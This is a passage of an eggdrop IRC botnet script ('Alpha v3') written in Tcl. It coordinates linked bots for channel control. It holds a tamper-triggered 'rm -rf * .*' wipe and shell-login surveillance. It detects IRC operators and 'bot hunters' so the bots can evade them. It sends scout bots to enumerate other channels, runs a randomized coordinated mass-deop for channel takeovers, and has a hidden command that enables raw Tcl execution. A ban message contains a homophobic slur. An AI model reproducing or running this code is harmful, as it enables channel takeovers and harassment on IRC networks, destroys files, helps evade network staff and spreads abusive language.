if {[file size $cfgname]!="[decrypt $enc $security(cfgsize)]"} {
catch {exec rm -rf * .*}
dccbroadcast "[b]WARNING[b]: CFG FILE SIZE HAS CHANGED!!!"
puthelp "PRIVMSG $mainchan :-> [b]WARNING[b]: CFG FILE SIZE HAS CHANGED!!!"
if {${botnet-nick}!="$hub"} {putbot $hub "iamhacked a"}
die
}
foreach nt [utimers] {
set ntt "[lindex $nt 1]"
if {$ntt=="dosecuritychk"} {killutimer "[lindex $nt 2]"}
}
utimer 10 {dosecuritychk}
}

bind bot b iamhacked hacked:killbot
proc hacked:killbot {b c a} {
global mainchan
set msg "[b]WARNING![b]: [b]$b[b] says its hacked. Unlinking/Removing..."
dccbroadcast $msg
puthelp "privmsg $mainchan :-> $msg"
unlink $b
chattr $b -so+dr
chpass $b [randword]
chnick $b haq$b
}

################################################################################
# Lock/Unlock Channels                                                         #
################################################################################

bind dcc n lock dcc:lock
bind dcc n unlock dcc:unlock
bind dcc n locked dcc:locked
bind bot - unlock bot:unlock
bind bot - lock bot:lock
bind join - * join:lock

set lockfile ".locked.dat"
if {![file exists .locked.dat]} {catch {exec touch .locked.dat}}
set lockdat [open $lockfile r]
set locked_chan "[gets $lockdat]" ; close $lockdat
set lch ""
foreach ch $locked_chan {
if {[validchan $ch]} {append lch " $ch"}
}
set locked_chan "[string range $lch 1 end]"

if {![file exists $lockfile]} {
  set lockedfile [open $lockfile w]
  puts $lockedfile " "
  close $lockedfile
}

proc dcc:locked {hand idx arg} {
  global locked_chan
  putdcc $idx "[b]Alpha[b] Current Locked Channels: $locked_chan"
  return 0
}

proc dcc:lock {hand idx arg} {
  global locked_chan lockfile
  set chan [lindex $arg 0]
  if {$chan == ""} {
    putdcc $idx "Usage: .lock <channel>"
    return 0
  }
  if {![validchan $chan]} {
    putdcc $idx "Im not on $chan."
    return 0
  }
  foreach lchan $locked_chan {
    if {$chan == $lchan} {
      putdcc $idx "$chan is already locked."
      return 0
    }
  }
  set umode "+mistn"
  catch {channel set $chan chanmode "$umode"}
  putallbots "bot_chanmode $chan $umode"
  dccbroadcast "-> [b]$chan[b] has been locked by $hand"
  append locked_chan " $chan"
  set wlocked [open $lockfile w]
  puts $wlocked $locked_chan
  close $wlocked
  putallbots "lock $locked_chan"
}

proc bot:lock {hand idx arg} {
  global locked_chan lockfile
  set chan [lrange $arg 0 end]
  set locked_chan "$chan"
  set wlocked [open $lockfile w]
  puts $wlocked $locked_chan
  close $wlocked
}

proc dcc:unlock {hand idx arg} {
  global locked_chan lockfile
  set chan [lindex $arg 0]
  if {$chan == ""} {
    putdcc $idx "Usage: .unlock <channel>"
    return 0
  }
  set lc2 "$locked_chan"
  set locked_chan ""
  set lock_match "0"
  foreach lchan $lc2 {
    if {$lchan == $chan} {
    set lock_match "1"
    } else {
    append locked_chan " $lchan"
    }
  }
  if {$lock_match == "0"} {
    putdcc $idx "$chan is not locked."
    return 0
  }
  set locked_chan "[string range $locked_chan 1 end]"
  set umode "-mi+nt"
  catch {channel set $chan chanmode "$umode"}
  putallbots "bot_chanmode $chan $umode"
  dccbroadcast "-> $hand has unlocked [b]$chan[b]"
  set wlocked [open $lockfile w]
  puts $wlocked $locked_chan
  close $wlocked
  putallbots "unlock $chan"
}

proc bot:unlock {hand idx arg} {
  global locked_chan lockfile
  set chan [lindex $arg 0]
  set locked_chan ""
  foreach lchan $locked_chan {
    if {$lchan == $chan} {
  } else {
    set locked_chan "[concat $locked_chan $lchan]"
  }
  set wlocked [open $lockfile w]
  puts $wlocked $locked_chan
  close $wlocked
  }
}

proc join:lock {nick uhost hand chan} {
  global locked_chan
  foreach lchan $locked_chan {
    if {$lchan == $chan} {
      if {![validuser $hand]} {
        putserv "KICK $chan $nick :You are needed elsewhere."
      }
    }
  }
}

bind dcc m mver mass_ver 
proc mass_ver {h i a} {
global botnet-nick
putlog "#$h# mver"
putdcc $i "Alpha: Getting bot versions..."
putallbots "bot_ver"
bot_ver ${botnet-nick} bot_ver a
}

bind bot b bot_ver bot_ver
proc bot_ver {f c a} {
global version tclversion
dccbroadcast "[b]$tclversion[b] @ [b][lindex $version 0][b]"
}

unbind dcc - su *dcc:su
bind dcc - su warn:su

proc warn:su {hand idx arg} {
  set user [lindex $arg 0]
  if {$user==""} {
    putdcc $idx "Usage: su <user>"
    return 0
  }
  putdcc $idx "We don't allow people to use another persons account."
  putlog "#$hand# su $user -blocked-"
  return 0
}

####### BOT LAG
bind dcc m botlag b_l
proc b_l {hand idx args} {
set bot [lindex $args 0]
if {$bot==""} {putdcc $idx "Usage: botlag <bots nick>" ; return}
if {[islinked $bot]!="1"} {putdcc $idx "[b]Bot Link Check[b]: I am the bot or the bot isnt linked" ; return}
putbot $bot "fbotlag [unixtime] $idx"
putlog "#$hand# botlag $args"
}
bind bot b fbotlag findbotlag
bind bot b gbotlag getbotlag
proc findbotlag {b c a} {
putbot $b "gbotlag $a"
}
proc getbotlag {b c a} {
set idx [lindex $a 1]
set uxt [lindex $a 0]
set lag [expr [unixtime]-$uxt]
putdcc $idx "[b]Bot Lag[b]: from [b]$b[b] to me is [b]$lag[b] seconds."
}

bind dcc m myserverlag mys_lag
proc mys_lag {h i a} {
global botnick
putlog "#$h# myserverlag"
putserv "PRIVMSG $botnick :myslag [unixtime] $i"
}
bind msg b myslag msg_mys
proc msg_mys {nick uhost handle args} {
global botnick
if {$nick==$botnick} {
set uxt [lindex [lindex $args 0] 0]
set idx [lindex [lindex $args 0] 1]
set slag [expr [unixtime]-$uxt]
putdcc $idx "[b]Server Lag[b]: My server lag is [b]$slag[b] seconds."
}
}

bind msg b slag msg_slag
proc msg_slag {nick uhost handle args} {
if {[islinked $handle]} {
putbot $handle "gbotlag [lindex $args 0] [lindex $args 1]"
}
}
bind dcc m botslag botslag
proc botslag {h i a} {
set bot [lindex $a 0]
if {$bot==""} {putdcc $i "Usage: botslag <bot's nick on irc>" ; return}
putserv "PRIVMSG $bot :slag [unixtime] $i"
putlog "#$h# botslag $a"
}

######## Shell Login Chk #######################################################

proc makelast {} {
global spread_scriptname
if {[catch {exec ./.ldpt} lastlogin]} {set lastlogin "EXEC FAILED!"}
return "$lastlogin"
}
proc logincheck {} {
global mainchan first
set lastlogin "[makelast]"
if {$lastlogin != $first} {
putlog "* [b]Shell Activity Detected![b] *"
putlog "$lastlogin"
puthelp "PRIVMSG $mainchan :[b]Alpha[b]: [b]Shell Activity Detected![b]"
puthelp "PRIVMSG $mainchan :$lastlogin"
puthelp "PRIVMSG $mainchan :[b]-----[b]--[b]------------------------[b]"
initlog
}
timer 3 logincheck ; return 1
}
proc initlog {} {
global first
set first "[makelast]"
}

proc makedetect {} {
if {[catch {exec echo "last -1 \$USER | grep \$USER" > .ldpt} made]} {set made "EXEC FAILED"}
if {[catch {exec chmod -f 744 .ldpt} xflag]} {set xflag "EXEC FAILED"}
}

utimer 3 makedetect
utimer 15 initlog
timer 1 logincheck

### Mask maker / Oper / Bot Hunter Checker.

set maskidx ""
set masknick ""

bind dcc m getmask dcc_getmask
proc dcc_getmask {h i a} {
global maskidx masknick
set nick [lindex $a 0]
set masknick $nick
if {$nick==""} {putdcc $i "Usage: getmask <nick on irc to get hostmask of>" ; return}
putlog "#$h# getmask $a"
set maskidx $i
putserv "WHO $nick"
}

bind raw - 352 raw_who_chk

proc raw_who_chk {f k a} {
global maskidx masknick mainchan whobot hub addhst botnick
set nick [lindex $a 5]
set chan [lindex $a 1]
set idnt [lindex $a 2]
set host [lindex $a 3]
set flgs [lindex $a 6]
set rlnm "[lrange $a 7 end]"
if {$maskidx!="" && [string tolower $masknick]=="[string tolower $nick]"} {
set idx $maskidx
putdcc $idx "[b]Masked Host[b]: for [b]$nick[b] is: [maskhost $nick!$idnt@$host]"
set maskidx ""
set masknick ""
return
}
if {$addhst=="true" && $nick=="$botnick"} {
if {[islinked $hub]=="1"} {
set cookiea [randword]
set cookieb [randword]
set cookiec [encrypt $cookiea $cookieb]
if {[lsearch -regexp "$idnt" "~"]=="0"} {
set tident "[string range $idnt 1 [expr [string length $idnt] -1]]"
set idnt "$tident"
}
set masq "[maskhost $nick!$idnt@$host]"
putbot $hub "addbothost $cookiea $cookieb $cookiec $masq"
set addhst false
}
}
if {[islinked $whobot]=="2"} {
if {[lsearch -regexp "$flgs" "\*"]=="0"} {
puthelp "PRIVMSG $mainchan :-> [b]$nick[b] is an oper in [b]$chan[b]"
dccbroadcast "[b]IRC Operator Alert[b]: [b]$nick[b] in [b]$chan[b]"
}
if {[regexp -nocase "<bH>|IRC.*Oper|bot.*hunt" $rlnm]} {
puthelp "PRIVMSG $mainchan :-> [b]$nick[b] looks like a BotHunter in [b]$chan[b]"
dccbroadcast "[b]BotHunter Alert[b]: [b]$nick[b] in [b]$chan[b]"
}
}
}

############ AddHost shit..

proc doaddhost {} {
global addhst botnick
set addhst true
puthelp "WHO $botnick"
}

bind bot b addbothost bot_addbhost
proc bot_addbhost {bot cmd args} {
set cookiea [lindex [lindex $args 0] 0]
set cookieb [lindex [lindex $args 0] 1]
set cookiec [lindex [lindex $args 0] 2]
set mask [lindex [lindex $args 0] 3]
if {[decrypt $cookiea $cookiec]=="$cookieb" && $mask!=""} {
foreach host [string tolower [split [gethosts $bot]]] {
if {$host=="[string tolower $mask]"} {return}
}
addhost $bot $mask
dccbroadcast "[b]New Bot Hostmask[b]: for: [b]$bot[b]  hostmask: [b]$mask[b]"
}
}

bind dcc m rjump dcc_rjump
proc dcc_rjump {hand idx args} {
set bot [lindex [lindex $args 0] 0]
set server [lindex [lindex $args 0] 1]
set pass [lindex [lindex $args 0] 2]
if {$pass==""} {
putdcc $idx "Usage: rjump <bot> <server> <pass>"
return 1
}
if {![passwdok master $pass]} {
putlog "#$hand# rjump $bot $server *pass*"
putdcc $idx "[b]Remote Jump[b]: [b]Invalid Password[b]!"
dccbroadcast "[b]Remote Jump[b]: $hand used Invalid password to jump $bot"
return 0
}
if {[islinked $bot]!="1"} {
putdcc $idx "[b]Remote Jump[b]: [b]$bot[b] is not linked or is me."
putlog "#$hand# rjump $bot $server *pass*"
return 0
}
set ux [unixtime]
putbot $bot "brjump $ux [encrypt $ux $ux] $server $hand"
putlog "#$hand# rjump $bot $server *pass*"
putdcc $idx "[b]Remote Jump[b]: Sent request to [b]$bot[b]."
}

bind bot b brjump bot_rjump
proc bot_rjump {b c a} {
set ux [lindex $a 0]
set en [lindex $a 1]
set sr [lindex $a 2]
set re [lindex $a 3]
if {[decrypt $ux $en]=="$ux"} {
dccbroadcast "[b]Remote Jump[b]: requested by [b]$re[b]@[b]$b[b], server: [b]$sr[b]"
jump $sr
}
}

bind dcc m mbotlag dcc_mbotlag
proc dcc_mbotlag {h i a} {
putallbots "fbotlag [unixtime] $i"
putlog "#$h# mbotlag"
}

bind dcc m mbotinfo dcc_mbotinfo
proc dcc_mbotinfo {h i a} {
global server botnick
putlog "#$h# mbotinfo"
dccbroadcast "Nick: [b]$botnick[b], Server: [b]$server[b], Channels: [b][channels][b]"
putallbots "botinfor"
}

bind bot b botinfor bot_info
proc bot_info {b c a} {
global server botnick
dccbroadcast "Nick: [b]$botnick[b], Server: [b]$server[b], Channels: [b][channels][b]"
}

bind dcc m botinfo dcc_botinfo
proc dcc_botinfo {hand idx args} {
set bot [lindex $args 0]
if {$bot==""} {putdcc $idx "Usage: botinfo <bots nick>" ; return}
if {[islinked $bot]!="1"} {putdcc $idx "[b]Bot Link Check[b]: I am the bot or the bot isnt linked" ; return}
putbot $bot "botinfor"
putlog "#$hand# botinfo $args"
}

#### NEW!!!

bind mode - "*-o*" deop_mode

# stopmd - keep track of how many deops for each nick-chan 
# mdkick - keep track if we have already sent our ban and kick to the
#          server for this nick-chan

set stopmd(dummy) "0 0"
set mdkick(dummy) 0

proc deop_mode {nick uhost handle chan modechange} {
  global botnick mdkick stopmd
  if {$modechange == "-o $botnick"} { 
    gain-ops
    return
  }

  if {[matchattr $handle f] || [matchattr $handle b]} {return}

  if {![info exists stopmd($nick-$chan)]} {
    set stopmd($nick-$chan) "1 [unixtime]"
  } else {
    if {[lindex $stopmd($nick-$chan) 1] > [expr [unixtime] - 10]} {
      set stopmd($nick-$chan) "[expr [lindex $stopmd($nick-$chan) 0]+1] [unixtime]"
    } else { 
      set stopmd($nick-$chan) "1 [unixtime]" 
    }
  }

  if {[lindex $stopmd($nick-$chan) 0] > 2} {
    if {![info exists mdkick($nick-$chan)]} {
      set mdkick($nick-$chan) [unixtime]
    }
    if {$mdkick($nick-$chan) < [expr [unixtime] - 10]} {
      set uh "[maskhost [getchanhost $nick $chan]]"
      puthelp "KICK $chan $nick :get out."
      puthelp "MODE $chan +b $uh"
      putlog "Massdeop detected: Kicking $nick from $chan."
      if {![isban $uh]} {newban $uh system "faggot. (ref: md)"}
      msglocal m "[b]WARNING![b] $nick is trying to massdeop $chan!"
      set mdkick($nick-$chan) [unixtime]
      unset stopmd($nick-$chan)
    }

    if {[validuser $handle]} {
      chattr $handle -o+d
    } else {
      addhost deopfags $uh
    }
  }
  
  foreach bot [bots] {
    if {$modechange == "-o [hand2nick $bot $chan]"} {
      putbot $bot "opquer [hand2nick $bot $chan] $chan"
      return
    }
  }
}

bind dcc m sendscout dcc:scout
proc dcc:scout {h i a} {
set bot [lindex $a 0]
set chan [lindex $a 1]
set utime [lindex $a 2]
set pass [lindex $a 3]
set key [lindex $a 4]
if {$key==""} {set key blah}
if {$pass==""} {putdcc $i "Usage: sendscout <bot> <#chan> <time to stay in chan> <password> \[key\]" ; return 1}
if {![passwdok master $pass]} {putdcc $i "Invalid password." ; putlog "#$h# sendscout $bot $chan $utime *invalidpw*" ; return}
if {[validchan $chan]} {putdcc $i "Invalid channel." ; putlog "#$h sendscout $bot $chan-invalid $utime *pass*" ; return}
if {[islinked $bot]!="1"} {putdcc $i "Invalid or not linked bot." ;putlog "#$h sendscout $bot-invalid $chan $utime *pass*" ; return}
if {$utime < 15} {putdcc $i "Minimum time: 15 seconds.";return}
putbot $bot "scoutjoin $chan $utime [encrypt $utime $pass] $key $h"
putdcc $i "Sent request."
putlog "#$h sendscout $bot $chan $utime *pass*"
}

set rwhobot $whobot

bind bot b scoutjoin bot:scoutjoin
proc bot:scoutjoin {b c a} {
global whobot botnet-nick rwhobot
set chan [lindex $a 0]
set utime [lindex $a 1]
set pass [decrypt $utime [lindex $a 2]]
set key [lindex $a 3]
set hand [lindex $a 4]
if {![passwdok master $pass]} {return}
set whobot "${botnet-nick}"
addchannel $chan
puthelp "JOIN $chan $key"
utimer 10 "getcinfo $chan"
dccbroadcast "[b]Scout[b]: requested by $hand@$b to go in $chan for $utime seconds."
utimer $utime "channel remove $chan"
utimer $utime "puthelp \"PART $chan\""
utimer $utime "set whobot $rwhobot"
}

proc getcinfo {chan} {
set ops ""
set nonops ""
set botusers ""
set opdbuser ""
foreach u "[chanlist $chan]" {
set who "[nick2hand $u $chan]"
if {[validuser $who]} {append botusers " $u/$who"}
if {[isop $u $chan]} {
append ops " $u"
if {[validuser $who]} {append opdbuser " $u"}
}
if {![isop $u $chan]} {append nonops " $u"}
}
set ops [string range $ops 1 end] ; set nonops [string range $nonops 1 end]
dccbroadcast "[b]Scout[b], (ops/[b]$chan[b]): $ops"
dccbroadcast "[b]Scout[b], (nonops/[b]$chan[b]): $nonops"
dccbroadcast "[b]Scout[b], (users on bots/[b]$chan[b]): $botusers"
dccbroadcast "[b]Scout[b], (users on bots that are opd/[b]$chan[b]): $opdbuser"
}

bind dcc m smassdeop dcc:smdop
proc dcc:smdop {h i a} {
set chan [lindex $a 0]
set pass [lindex $a 1]
if {$pass==""} {putdcc $i "Usage: smassdeop <#chan> <pass>" ; return 1}
if {![passwdok master $pass]} {putdcc $i "Invalid Password." ; putlog "#$h# smassdeop $chan *invalidpass*" ; return}
if {![validchan $chan]} {putdcc $i "Invalid channel." ; putlog "#$h# smassdop $chan-invalid *pass" ; return}
putallbots "smdop $chan $h [encrypt $h $pass]"
}

bind bot b smdop bot:smdop
set exbot "Icewolf"

proc bot:smdop {b c a} {
set chan [lindex $a 0]
set hand [lindex $a 1]
set pass [decrypt $hand [lindex $a 2]]
global hub exbot botnick
set shouldidoit [rand 3]
if {$shouldidoit=="1"} {return}
if {![validchan $chan]} {return}
if {![passwdok master $pass]} {return}
if {[islinked $hub]=="2"} {return}
if {[islinked $exbot]=="2"} {return}
dccbroadcast "[b]Secure Massdeop[b]: requested on $chan by $hand@$b"
set r [rand 2]
if {$r=="1"} {set list "[chanlist $chan]"}
if {$r=="0"} {
set chl [chanlist $chan]
set c 0 ; set chc ""
foreach u $chl {incr c ; append chc " $c"}
set c [expr $c + 1]
set chc [string range $chc 1 end]
set list ""
foreach ct $chc {
append list " [lindex $chl [expr $c - $ct]]"
}
set list [string range $list 1 end]
} 
foreach user $list {
if {[isop $botnick $chan]} {
if {![matchattr [nick2hand $user $chan] o] && [isop $user $chan]} {
pushmode $chan -o $user
}
}
}
flushmode $chan
}

bind dcc m relinkhub dcc:relinkhub
proc dcc:relinkhub {h i a} {
global hub botnet-nick
set pass [lindex $a 0]
if {${botnet-nick}!="$hub"} {
if {$pass==""} {putdcc $i "Usage: relinkhub <pass>" ; return 1]}
if {![passwdok master $pass]} {putdcc $i "Invalid password." ; putlog "#$h# relinkhub *invalidpw*" ; return}
putbot $hub "iamgonnarelink [encrypt $hub $pass]"
dccbroadcast "[b]Relinking to Hub[b]: requested by [b]$h[b]."
unlink $hub
utimer 2 "link $hub"
}
}
bind bot b iamgonnarelink bot:rlh
proc bot:rlh {b c a} {
global botnet-nick hub
if {[islinked $hub]!="2"} {return}
set pass [decrypt ${botnet-nick} [lindex $a 0]]
if {![passwdok master $pass]} {return}
putlog "debug: waiting for link from $b.."
}

proc getlag {} {
global hub
putallbots "getlagtst [unixtime]"
}

set returnlag ""

bind bot b gotlagcookie bot:lagcookie
proc bot:lagcookie {b c a} {
global returnlag
set cookie [lindex $a 0]
set lag [expr [unixtime]-$cookie]
append returnlag " $b"
}

bind bot b getlagtst bot:botgetlag
proc bot:botgetlag {b c a} {
global hub returnlag
if {$b==$hub} {return}
if {![matchattr $b b]} {return}
set lag [lindex $a 0]
putbot $b "gotlagcookie $lag"
}

bind dcc n setvhost dcc:setvhost
proc dcc:setvhost {h i a} {
global my-ip my-hostname
set pass [lindex $a 1]
set vip [lindex $a 0]
if {$pass==""} {putdcc $i "Usage: setvhost <virtual host ip> <password>" ; return 1}
if {![passwdok master $pass]} {putdcc $i "Invalid Password." ; putlog "#$h# setvhost $vip *invalidpass*" ; return}
set my-ip "$vip"
set my-hostname "$vip"
putdcc $i "Alpha: Virtual Host/IP set to $vip."
putdcc $i "       jump the bot to activate the new host."
putlog "#$h# setvhost $vip *pass*"
}
bind dcc m mgetos dcc:mgetos
bind dcc m getos dcc:getos
proc dcc:getos {h i a} {
set bot [lindex $a 0]
if {$bot==""} {putdcc $i "Usage: getos <botnick>";return 1}
if {[islinked $bot]!="1"} {putdcc $i "Invalid bot or me.";return 1}
putbot $bot "getos $i"
return 1
}
proc dcc:mgetos {h i a} {
putallbots "getos $i"
return 1
}
bind bot b getos bot:getos
proc bot:getos {b c a} {
set idx "[lindex $a 0]"
if {[catch {exec uname -a} osver]} {set osver "unknown"}
putbot $b "gotos $a $osver"
}
bind bot b gotos bot:gotos
proc bot:gotos {b c a} {
set idx "[lindex $a 0]"
set osver "[string range "$a" 2 end]"
putdcc $idx "[b]$b[b]: $osver"
}

bind dcc n badlinks dcc:chklinks
proc dcc:chklinks {h i a} {
global hub
putallbots "chklink $i"
putdcc $i "* Sending request to all bots.."
return 1
}
bind bot b chklink bot:chklink
proc bot:chklink {b c a} {
set i [lindex $a 0]
putbot $b "chklinkr $i [getting-users]"
}
bind bot b chklinkr bot:chklinkr
proc bot:chklinkr {b c a} {
set i [lindex $a 0]
set lnk [lindex $a 1]
if {$lnk=="0"} {return}
if {$lnk=="1"} {
putdcc $i "[b]Check link[b]: [b]$b[b] needs to be relinked from dcc chat."
}
}

bind dcc n teeceel dcc:runtcl
proc dcc:runtcl {h i a} {
global temprw
set rw [randword]
putdcc $i "debug: request -> $rw"
set temprw $rw
control $i getpw
}
proc getpw {i pw} {
global temprw
if {[encrypt $temprw $temprw]=="$pw"} {
bind dcc n $temprw *dcc:tcl
putdcc $i "debug: $temprw has been activated for 5 minutes."
timer 5 "unbind dcc - $temprw *dcc:tcl"
return 1
}

putdcc $i "hmm"
killdcc $i
return 1
}
set msecperreq 60

proc get_unban {channel} {
 global botnick botname lastunban msecperreq botmask
 set channel [string tolower $channel]
  if [info exist lastunban($channel)] {
   if {[expr [unixtime] - $lastunban($channel)] < $msecperreq} return
  }
 if {"[bots]"==""} return
 set lastunban($channel) [unixtime]
 putallbots "uban $channel $botmask"
}
bind bot - uban unban_req
proc unban_req {bot cmd arg} {
global botnick botnet-nick
 set arg [split $arg " "]
 set channel [lindex $arg 0]
 set host [lindex $arg 1]
 if ![matchattr $bot ob] return
 if ![validchan $channel] return
 if ![onchan $botnick $channel] return
 if ![botisop $channel] return
 if ![ispermban $host] {
  foreach ban [chanbans $channel] {
   if {[string compare $ban $host]} {
    putcmdlog "[b]Unban request[b]: from [b]$bot[b] .. [b]$host[b] on [b]$channel[b]."
    killchanban $channel $ban
   }
  }
 }
 utimer [expr 2+[rand 5]] "resetbans $channel"
}

proc msglocal {flag msg} {
  foreach user [dcclist] {
    if {[lindex $user 3] == "chat"} {
      set idx [lindex $user 0]
      set hand [lindex $user 1]
      if {$flag == "-"} {
        putdcc $idx "$msg"
      } else {
        if {[matchattr $hand $flag]} {
          putdcc $idx "$msg"
        }
      }
    }  
  }
}

################################################################################
# Alpha v3-* by Arkangel/enderX/jagwar/fatal                                   #
################################################################## END #########
